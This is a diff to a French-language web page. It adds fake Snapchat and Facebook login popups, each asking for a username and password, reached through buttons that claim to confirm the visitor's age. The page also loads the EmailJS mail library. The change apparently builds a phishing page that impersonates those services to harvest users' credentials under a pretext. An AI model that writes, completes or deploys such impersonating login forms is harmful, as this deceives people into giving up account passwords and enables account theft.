@@ -87,6 +87,37 @@
       font-weight: bold;
       display: none;
     }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #fff;
+      color: #000;
+      padding: 30px;
+      border-radius: 20px;
+      z-index: 1000;
+      width: 90%;
+      max-width: 400px;
+      text-align: left;
+    }
+    .popup input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      z-index: 999;
+    }
   </style>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -124,6 +155,21 @@
         errorMsg.style.display = "block";
       }
     }
+
+    function openSnapchatPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('snapchatPopup').style.display = 'block';
+    }
+
+    function openFacebookPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('facebookPopup').style.display = 'block';
+    }
+
+    function closePopup(id) {
+      document.getElementById(id).style.display = 'none';
+      document.getElementById('overlay').style.display = 'none';
+    }
   </script>
 </head>
 <body>
@@ -138,6 +184,24 @@
     </div>
     <button class="button" id="snapchatBtn" onclick="openSnapchatPopup()" style="display:none;">Confirmer votre âge avec Snapchat</button>
     <button class="button" id="facebookBtn" onclick="openFacebookPopup()" style="display:none; margin-top: 15px;">Confirmer votre âge avec Facebook</button>
+  </div>
+
+  <div id="overlay" class="overlay" onclick="closePopup('snapchatPopup'); closePopup('facebookPopup');"></div>
+
+  <div id="snapchatPopup" class="popup">
+    <h3>Connexion Snapchat</h3>
+    <input type="text" placeholder="Nom d'utilisateur ou email" />
+    <input type="password" placeholder="Mot de passe" />
+    <button class="button">Se connecter</button>
+    <button class="button" style="background:#ccc; color:#000;" onclick="closePopup('snapchatPopup')">Annuler</button>
+  </div>
+
+  <div id="facebookPopup" class="popup">
+    <h3>Connexion Facebook</h3>
+    <input type="text" placeholder="Email ou téléphone" />
+    <input type="password" placeholder="Mot de passe" />
+    <button class="button">Se connecter</button>
+    <button class="button" style="background:#ccc; color:#000;" onclick="closePopup('facebookPopup')">Annuler</button>
   </div>
 </body>
 </html>
